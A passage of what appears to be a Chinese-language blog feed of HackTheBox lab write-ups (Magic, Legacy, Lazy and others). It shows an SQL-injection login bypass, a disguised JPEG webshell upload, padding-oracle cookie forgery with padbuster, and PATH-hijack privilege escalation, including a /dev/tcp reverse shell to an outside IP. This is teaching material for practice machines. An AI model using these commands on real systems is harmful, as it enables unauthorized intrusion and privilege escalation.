  </entry>
  <entry>
    <title>HTB:Laboratory</title>
    <url>/2021/02/09/HTB-Laboratory/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="b9a7ffa64d1b8b5666575e47e4d718b88fb0c9952ab5b49720a900797bbf5a4d">6b83b1484c1bd4d3cb7f0b3881091a917e82162c1010b073de7b97f343becdb3711cf2fb7aff6959fd2e9b5c0d3d367d764be4bc55138d1e7549242a24096e939938285a1e1bf45689a869c0c3ffedf91156a33ca563286439974bd3452882de7553a8f774e6022c8738a070ff57bc422fe9d5e5d379549148b3c32c6aaa757bc72cb897b196e320aae53ca6ba3a06cf8f6ec966b523ce10808da12db4f3621749a3d76c50961670d75ce05e7a91cdafa3e5f1b1dd411f97314cea06b4b123ef4fb60e22e41bfafad4bc1afa7859dd046fbb8bf7ba1ff9d0003fa1a5905b4e53ae390ae9de97d8d1c32d61eea079a86406793ce9e5e2f6989e7e027789a881896b50d36308e3d3a2fd25e3cba060cf8d215a65a9d94cb008454d24a20ebb22e567907bae02e5c647c2b9a22ede00652293f52b353770ddc819bd87896e740fe68a9cf1ec58e9e319547c048a50f46cba0f436bc9f8dc17b7fd0a67b7065219f172803c1f601cc66ca277f81b0750f0f5fc65317a8ca92063a1713b11e633388d009ef876f7c777233881246b15b0c2eed9c0b9f307682671f2801cb2baf6b3f83ddf19f89d92e2bb0e6ff74839334b6c9c537f9c2ee64ab85ada825eb07491b95491c971c0aed44d137ede6847ed60698d69db44b406e15022a3375e65d2c4fe82e58f67bdbec01c843a659cae61c3a167fd0f43bb9e32d817c44ea4fdc1438c85bea631c7ed611cd60006efb9d8406ff3c799d0ae427a8b496277b14ac572ede248d70974b8098a43c8438e63e98b9709122442972a04e1bec9378a6100a12dfa12848c530a7b387b7690bbc06ac8c9ff8b74ad922c274b0a14a8c3da9897696f7398c74d1fa91e1f340f98cfdee6a5787ade20d11052b1e7973bb5cba05371c2d7758064b3a6d41dd092775053e9be0e9797050d3f63c05776c3e32ba6a14d9efc69a6390bb642ecba8b3a61ec00876e954edf428455940a74d649a68114417221d8f45207b1d00efb5acd4ec1de53b27b6f53a31bb870c8c774c355ab3eec1317cf5fafda7c10888b04cb7d0eec5f9d16f449d015f2dfeb6ed13d59c2ac8b1e2f3fac4403abda465d74e3fb0cfef8ce8ecd434deea7ba557739c4f68f550042209fd3e535f98e3eb7118ddaa1b604eaa9ccdcaf7e22c55a5621b93678858d7b6b182afa5fb8f335e69ae09c1af5e3228de16ec16a167a9c2923cecdedafd684d85ac75bce972180760af4f9ec26ac337ea834083bfbc9f550e1ffc898733ce7a0f1bbaf94d77c6797b86b411e01319d5f04b366c8515e107c8b14187840a76c339fbdd87dcd9128da09cb20177a1bce3788a01d816b0e6aa12509fde53b5bd07653d7a3f5700143ca20aa3549de079125eb096e35db673a4ef35d2b0ce6cab8a5632ec6c9f6fcae7509b91d3e5149e28361595f12235c5385ec6bd8f84f8002612c6489ef1464d9709413035449dc1fba7c41ecee8c1353e87615bb62eed25b343ea0144259fa3165a275b4ba513d03fbfe4c9144c2d3cc1e310cb1b4ee4f9fc172b988adf5301df1911038c46a1a61cb873ac4287d09b8f9258ef05d6b8845617af9448ccf266604edfcc91350a15e83724d02ff8da970fb8c71513e2606a0aef19600a3d7f8f4c2084c7c42b8f5be8cb20affe0e9c2e5266f3d9a2f49fa7a419c1505c03abd91a839ac0e272d45f874640589e88f07affdb7ca75783922fcd865d4b70a4aa812732621bb5505e78873d9e3d6b1caa675a30abfee8e633f04cebc906b0f49489901d891f0debdaf</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">root hash($6...V0)</span>
      </label>
    </div>
  </div>
</div>
<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Magic</title>
    <url>/2020/11/16/HTB-Magic/</url>
    <content><![CDATA[<h1 id="Maigc"><a href="#Maigc" class="headerlink" title="Maigc"></a>Maigc</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/magic/1.png" alt="1"></p>
<p>只发现了22和80端口，大概率是一次web渗透</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/magic/8.png" alt="8"></p>
<p>可以发现直接枚举到images下面的目录，尝试访问images目录</p>
<p><img src="/images/magic/9.png" alt="9"></p>
<p>提示无法访问，所以这个<code>images/uploads</code>的路径应该是从其他页面上爬出来的</p>
<p>检查后发现主页有提示</p>
<p><img src="/images/magic/10.png" alt="10"></p>
<p>所以不需要子目录枚举</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>直接访问首页就可以找到登录页面</p>
<p><img src="/images/magic/2.png" alt="2"></p>
<p>尝试一些弱口令，发现不行，会报错提示</p>
<p><img src="/images/magic/3.png" alt="3"></p>
<p>尝试sql注入，这里可能需要使用burp，页面无法输入空格，可能是某个javascript的功能，但其实无法所谓，可以使用sql注入的bypass空格的技巧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p>年轻人不讲武德，很快啊，很快，就得到了上传点</p>
<p><img src="/images/magic/4.png" alt="4"></p>
<p>尝试上传</p>
<p><img src="/images/magic/5.png" alt="5"></p>
<p>发现存在过滤，提示了允许上传的类型</p>
<p>看来不允许上传gif，所以可能需要jpeg的magic bytes进行绕过，我选择用一种简单粗暴的方式</p>
<p>先从网上随便下一张图片，名称为timg.jpg，直接凭借webshell的代码到maigc bytes后面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">head -n 2 timg.jpg &gt;shell.jpg</span><br><span class="line">cat shell.php &gt;&gt;shell.jpg</span><br></pre></td></tr></table></figure>

<p><img src="/images/magic/6.png" alt="6"></p>
<p>尝试上传</p>
<p><img src="/images/magic/7.png" alt="7"></p>
<p>提示上传成功，尝试去寻找webshell</p>
<p><code>images/uploads</code>目录显示文件</p>
<p><img src="/images/magic/12.png" alt="12"></p>
<p>但可以被直接访问到</p>
<p><img src="/images/magic/11.png" alt="11"></p>
<p>正常情况下，.jpg结尾的webshell需要LFI来获得RCE，但这里貌似apache存在某种解析漏洞，.jpg也可以RCE</p>
<p><img src="/images/magic/13.png" alt="13"></p>
<p>机器上没nc，用/dev/tcp反弹shell即可</p>
<p><img src="/images/magic/14.png" alt="14"></p>
<p>之后可以找webshell工作的原因，来自于.htaccess</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;.+\.ph(p([3457s]|\-s)?|t|tml)&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br><span class="line">&lt;Files ~ &quot;\.(sh|sql)&quot;&gt;</span><br><span class="line">   order deny,allow</span><br><span class="line">   deny from all</span><br></pre></td></tr></table></figure>

<p>只要文件名中包含ph(正则)，就会被php解析</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现了普通用户</p>
<p><img src="/images/magic/15.png" alt="15"></p>
<p>由于是sql注入进来的，所以尝试寻找数据库信息</p>
<p>web目录发现了连接信息和数据库名 </p>
<p><img src="/images/magic/16.png" alt="16"></p>
<p>不过竟然没有mysql连接程序</p>
<p><img src="/images/magic/17.png" alt="17"></p>
<p>可以使用mysqldump，不过看起来可能有些不友好</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">mysqldump -u theseus -p --databases Magic</span><br><span class="line">iamkingtheseus</span><br></pre></td></tr></table></figure>

<p><img src="/images/magic/19.png" alt="19"></p>
<p>远程端口转发可能好一些</p>
<p>这里需要指定ip和端口，否则会报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#mysql -u theseus -piamkingtheseus</span><br><span class="line">ERROR 2002 (HY000): Can&#39;t connect to local MySQL server through socket &#39;&#x2F;var&#x2F;run&#x2F;mysqld&#x2F;mysqld.sock&#39; (2)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#mysql -u theseus -piamkingtheseus -h 127.0.0.1 -P 3306</span><br></pre></td></tr></table></figure>

<p><img src="/images/magic/18.png" alt="18"></p>
<h3 id="user"><a href="#user" class="headerlink" title="user"></a>user</h3><p>密码切换到用户</p>
<p><img src="/images/magic/20.png" alt="20"></p>
<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p>发现了不寻常的SUID文件</p>
<p><img src="/images/magic/21.png" alt="21"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ltrace &#x2F;bin&#x2F;sysinfo</span><br></pre></td></tr></table></figure>

<p>发现</p>
<p><img src="/images/magic/22.png" alt="22"></p>
<p>看来是可以PATH劫持，不过这里稍微卡了一下，PATH不能随便设置，因为如果PATH只设置成/tmp，程序根本运行不到调用cat那一步，就报错停止了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $PATH</span><br><span class="line">echo &quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.2&#x2F;5555 0&gt;&amp;1&#39;&quot; &gt; &#x2F;tmp&#x2F;cat</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;local&#x2F;games</span><br><span class="line">which cat</span><br></pre></td></tr></table></figure>

<p>所以正确的方法是在当前PATH的最前面，加上/tmp，这样cat会优先调用/tmp/cat，而不是/bin/cat</p>
<p><img src="/images/magic/23.png" alt="23"></p>
<p>这样运行SUID文件，就能获得reverse_shell</p>
<p><img src="/images/magic/24.png" alt="24"></p>
<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>靶机非常贴心的给出了SUID提权的源代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;cassert&gt;</span><br><span class="line">#include &lt;cstdio&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;memory&gt;</span><br><span class="line">#include &lt;stdexcept&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">#include &lt;array&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">std::string exec(const char* cmd) &#123;</span><br><span class="line">    std::array&lt;char, 128&gt; buffer;</span><br><span class="line">    std::string result;</span><br><span class="line">    std::unique_ptr&lt;FILE, decltype(&amp;pclose)&gt; pipe(popen(cmd, &quot;r&quot;), pclose);</span><br><span class="line">    if (!pipe) &#123;</span><br><span class="line">        throw std::runtime_error(&quot;popen() failed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    while (fgets(buffer.data(), buffer.size(), pipe.get()) !&#x3D; nullptr) &#123;</span><br><span class="line">        result +&#x3D; buffer.data();</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    cout &lt;&lt; &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Hardware Info&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot; &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; exec(&quot;lshw -short&quot;) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Disk Info&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot; &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; exec(&quot;fdisk -l&quot;) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;CPU Info&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot; &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; exec(&quot;cat &#x2F;proc&#x2F;cpuinfo&quot;) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;MEM Usage&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot; &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; exec(&quot;free -h&quot;);</span><br><span class="line">    return(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现，只要exec执行的程序，都可以进行PATH劫持 ，如lshw，fdisk，cat，free</p>
<p>sqlmap注入可能存在一些问题，也许应该使用tamper</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -r sqli --batch --tamper&#x3D;space2comment --risk&#x3D;3 --level&#x3D;5 --dbms&#x3D;mysql</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Legacy</title>
    <url>/2020/06/04/HTB-Legacy/</url>
    <content><![CDATA[<h1 id="Legacy"><a href="#Legacy" class="headerlink" title="Legacy"></a>Legacy</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Legacy/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Legacy/2.jpg" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="MS08-067"><a href="#MS08-067" class="headerlink" title="MS08-067"></a>MS08-067</h3><p><img src="/images/Legacy/3.jpg" alt="3"></p>
<p>该漏洞有时候会利用失败，并导致服务崩溃，多重启2~3次即可</p>
<p>至此我们已取得<code>system</code>权限</p>
<p><img src="/images/Legacy/4.jpg" alt="4"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Lazy</title>
    <url>/2020/10/20/HTB-Lazy/</url>
    <content><![CDATA[<h1 id="Lazy"><a href="#Lazy" class="headerlink" title="Lazy"></a>Lazy</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Lazy/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Lazy/5.png" alt="5"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="方法1-oracle-padding-attack"><a href="#方法1-oracle-padding-attack" class="headerlink" title="方法1 oracle padding attack"></a>方法1 oracle padding attack</h3><p>尝试注册用户admin，提示用户已经存在，随便注册个账号进去看看</p>
<p><img src="/images/Lazy/6.png" alt="6"></p>
<p>啥也没有，但是发现了一个奇怪的地方</p>
<p>在index.php处cookie提交了一个auth参数</p>
<p><img src="/images/Lazy/7.png" alt="7"></p>
<p>如果修改cookie</p>
<p><img src="/images/Lazy/8.png" alt="8"></p>
<p>得到<code>Invalid padding</code>，根据这些，可以找到一个经典的漏洞:oracle padding attack</p>
<p>如果要理解过程，只需要理解一些基本的密码学知识:XOR，CBC加密和解密，PKCS #5，比特反转。然后google即可<br>这台机器的漏洞情况是，我们作为攻击者，知道了明文所构造的密文，并且能够触发解密过程(服务器会对解密是否成功进行提示)，那么我们就可以在不知道密钥的情况下，解密任意明文或者构造任意明文的合法密文</p>
<p>有一个工具padbuster可以进行利用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#padbuster http:&#x2F;&#x2F;10.10.10.18&#x2F;login.php gKUKbbMkmMs3tWym5PnSOp4IAyoXKyGE 8 -cookies auth&#x3D;gKUKbbMkmMs3tWym5PnSOp4IAyoXKyGE -encoding 0</span><br><span class="line"></span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| PadBuster - v0.3.3                        |</span><br><span class="line">| Brian Holyfield - Gotham Digital Science  |</span><br><span class="line">| labs@gdssecurity.com                      |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line"></span><br><span class="line">INFO: The original request returned the following</span><br><span class="line">[+] Status: 200</span><br><span class="line">[+] Location: N&#x2F;A</span><br><span class="line">[+] Content Length: 1486</span><br><span class="line"></span><br><span class="line">INFO: Starting PadBuster Decrypt Mode</span><br><span class="line">*** Starting Block 1 of 2 ***</span><br><span class="line"></span><br><span class="line">INFO: No error string was provided...starting response analysis</span><br><span class="line"></span><br><span class="line">*** Response Analysis Complete ***</span><br><span class="line">                                                                                                                                                             </span><br><span class="line">The following response signatures were returned:                                                                                                             </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">-------------------------------------------------------                                                                                                      </span><br><span class="line">ID#     Freq    Status  Length  Location</span><br><span class="line">-------------------------------------------------------</span><br><span class="line">1       1       200     1564    N&#x2F;A</span><br><span class="line">2 **    255     200     15      N&#x2F;A</span><br><span class="line">-------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Enter an ID that matches the error condition</span><br><span class="line">NOTE: The ID# marked with ** is recommended : 2</span><br><span class="line"></span><br><span class="line">Continuing test with selection 2</span><br><span class="line"></span><br><span class="line">[+] Success: (93&#x2F;256) [Byte 8]</span><br><span class="line">[+] Success: (20&#x2F;256) [Byte 7]</span><br><span class="line">[+] Success: (190&#x2F;256) [Byte 6]</span><br><span class="line">[+] Success: (118&#x2F;256) [Byte 5]</span><br><span class="line">[+] Success: (230&#x2F;256) [Byte 4]</span><br><span class="line">[+] Success: (151&#x2F;256) [Byte 3]</span><br><span class="line">[+] Success: (47&#x2F;256) [Byte 2]</span><br><span class="line">[+] Success: (3&#x2F;256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 1 Results:</span><br><span class="line">[+] Cipher Text (HEX): 37b56ca6e4f9d23a</span><br><span class="line">[+] Intermediate Bytes (HEX): f5d66f1f8e41eea2</span><br><span class="line">[+] Plain Text: user&#x3D;evi</span><br><span class="line"></span><br><span class="line">Use of uninitialized value $plainTextBytes in concatenation (.) or string at &#x2F;usr&#x2F;bin&#x2F;padbuster line 361, &lt;STDIN&gt; line 1.</span><br><span class="line">*** Starting Block 2 of 2 ***</span><br><span class="line"></span><br><span class="line">[+] Success: (196&#x2F;256) [Byte 8]</span><br><span class="line">[+] Success: (41&#x2F;256) [Byte 7]</span><br><span class="line">[+] Success: (3&#x2F;256) [Byte 6]</span><br><span class="line">[+] Success: (25&#x2F;256) [Byte 5]</span><br><span class="line">[+] Success: (92&#x2F;256) [Byte 4]</span><br><span class="line">[+] Success: (147&#x2F;256) [Byte 3]</span><br><span class="line">[+] Success: (75&#x2F;256) [Byte 2]</span><br><span class="line">[+] Success: (173&#x2F;256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 2 Results:</span><br><span class="line">[+] Cipher Text (HEX): 9e08032a172b2184</span><br><span class="line">[+] Intermediate Bytes (HEX): 5bb26ba1e3fed53d</span><br><span class="line">[+] Plain Text: l</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br><span class="line">** Finished ***</span><br><span class="line"></span><br><span class="line">[+] Decrypted value (ASCII): user&#x3D;evil</span><br><span class="line"></span><br><span class="line">[+] Decrypted value (HEX): 757365723D6576696C07070707070707</span><br><span class="line"></span><br><span class="line">[+] Decrypted value (Base64): dXNlcj1ldmlsBwcHBwcHBw&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>添加参数<code>-plaintext user=admin</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#padbuster http:&#x2F;&#x2F;10.10.10.18&#x2F;login.php gKUKbbMkmMs3tWym5PnSOp4IAyoXKyGE 8 -cookies auth&#x3D;gKUKbbMkmMs3tWym5PnSOp4IAyoXKyGE -encoding 0 -plaintext user&#x3D;admin</span><br><span class="line"></span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| PadBuster - v0.3.3                        |</span><br><span class="line">| Brian Holyfield - Gotham Digital Science  |</span><br><span class="line">| labs@gdssecurity.com                      |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line"></span><br><span class="line">INFO: The original request returned the following</span><br><span class="line">[+] Status: 200</span><br><span class="line">[+] Location: N&#x2F;A</span><br><span class="line">[+] Content Length: 1486</span><br><span class="line"></span><br><span class="line">INFO: Starting PadBuster Encrypt Mode</span><br><span class="line">[+] Number of Blocks: 2</span><br><span class="line"></span><br><span class="line">INFO: No error string was provided...starting response analysis</span><br><span class="line"></span><br><span class="line">*** Response Analysis Complete ***</span><br><span class="line"></span><br><span class="line">The following response signatures were returned:</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br><span class="line">ID#     Freq    Status  Length  Location</span><br><span class="line">-------------------------------------------------------</span><br><span class="line">1       1       200     1564    N&#x2F;A</span><br><span class="line">2 **    255     200     15      N&#x2F;A</span><br><span class="line">-------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Enter an ID that matches the error condition</span><br><span class="line">NOTE: The ID# marked with ** is recommended : 2</span><br><span class="line"></span><br><span class="line">Continuing test with selection 2</span><br><span class="line"></span><br><span class="line">[+] Success: (196&#x2F;256) [Byte 8]</span><br><span class="line">[+] Success: (148&#x2F;256) [Byte 7]</span><br><span class="line">[+] Success: (92&#x2F;256) [Byte 6]</span><br><span class="line">[+] Success: (41&#x2F;256) [Byte 5]</span><br><span class="line">[+] Success: (218&#x2F;256) [Byte 4]</span><br><span class="line">[+] Success: (136&#x2F;256) [Byte 3]</span><br><span class="line">[+] Success: (150&#x2F;256) [Byte 2]</span><br><span class="line">[+] Success: (190&#x2F;256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 2 Results:</span><br><span class="line">[+] New Cipher Text (HEX): 23037825d5a1683b</span><br><span class="line">[+] Intermediate Bytes (HEX): 4a6d7e23d3a76e3d</span><br><span class="line"></span><br><span class="line">[+] Success: (1&#x2F;256) [Byte 8]</span><br><span class="line">[+] Success: (36&#x2F;256) [Byte 7]</span><br><span class="line">[+] Success: (180&#x2F;256) [Byte 6]</span><br><span class="line">[+] Success: (17&#x2F;256) [Byte 5]</span><br><span class="line">[+] Success: (146&#x2F;256) [Byte 4]</span><br><span class="line">[+] Success: (50&#x2F;256) [Byte 3]</span><br><span class="line">[+] Success: (132&#x2F;256) [Byte 2]</span><br><span class="line">[+] Success: (135&#x2F;256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 1 Results:</span><br><span class="line">[+] New Cipher Text (HEX): 0408ad19d62eba93</span><br><span class="line">[+] Intermediate Bytes (HEX): 717bc86beb4fdefe</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br><span class="line">** Finished ***</span><br><span class="line"></span><br><span class="line">[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA</span><br><span class="line">-------------------------------------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到了cookie，尝试登录</p>
<p><img src="/images/Lazy/9.png" alt="9"></p>
<p>成功以admin登录，里面存在一个私钥文件，用户名为<code>mitsos</code></p>
<p><img src="/images/Lazy/10.png" alt="10"></p>
<p>这样就能获取shell</p>
<p><img src="/images/Lazy/11.png" alt="11"></p>
<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>简单粗暴，不过感觉是一个白盒漏洞，在注册页面注册时，注册账户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#x3D;</span><br></pre></td></tr></table></figure>

<p>也是可以跳转到正确的<code>index.php</code></p>
<p>这不是一个常规的sql注入，应该是一个逻辑漏洞，可以审计一波</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp -r -i id_rsa mitsos@10.10.10.18:&#x2F;var&#x2F;www&#x2F;html &#x2F;root&#x2F;Desktop&#x2F;test</span><br></pre></td></tr></table></figure>

<p>首先找到index.php处，发现页面显示的逻辑是强类型比较<code>$user</code></p>
<p><img src="/images/Lazy/2.png" alt="2"></p>
<p><code>$user</code>变量在<code>header.php</code>处定义，使用了函数<code>getuserfromcookie</code></p>
<p><img src="/images/Lazy/3.png" alt="3"></p>
<p>找到<code>getuserfromcookie</code>函数，发现了漏洞</p>
<p><img src="/images/Lazy/4.png" alt="4"></p>
<p>这里<code>$user</code>赋予了用户名，<code>$data</code>的值是<code>user=admin=</code>，但是<code>explode(&quot;=&quot;,.....)</code>转成数组的时候，消掉了多出的<code>=</code>，造成了逻辑漏洞</p>
<p>此时<code>$a</code>的值是user，<code>$user</code>的值是admin</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现SUID文件backup，运行可以查看<code>/etc/shadow</code></p>
<p><img src="/images/Lazy/12.png" alt="12"></p>
<p>ltrace查看，看来是直接通过PATH运行了cat命令</p>
<p><img src="/images/Lazy/13.png" alt="13"></p>
<p>PATH劫持提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;&#x2F;bin&#x2F;sh&#39; &gt; &#x2F;tmp&#x2F;cat</span><br><span class="line">chmod +x &#x2F;tmp&#x2F;cat</span><br><span class="line">export PATH&#x3D;&#x2F;tmp</span><br><span class="line">&#x2F;home&#x2F;mitsos&#x2F;backup</span><br><span class="line"></span><br><span class="line">export PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;local&#x2F;games</span><br></pre></td></tr></table></figure>

<p><img src="/images/Lazy/14.png" alt="14"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Mirai</title>
    <url>/2020/10/24/HTB-Mirai/</url>
    <content><![CDATA[<h1 id="mirai"><a href="#mirai" class="headerlink" title="mirai"></a>mirai</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Mirai/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Mirai/2.png" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p><img src="/images/Mirai/3.png" alt="3"></p>
<p>找到默认凭据</p>
<p><img src="/images/Mirai/5.png" alt="5"></p>
<p>可以ssh</p>
<p><img src="/images/Mirai/6.png" alt="6"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Mirai/7.png" alt="7"></p>
<p>root.txt无法直接读，提示在USB里有备份</p>
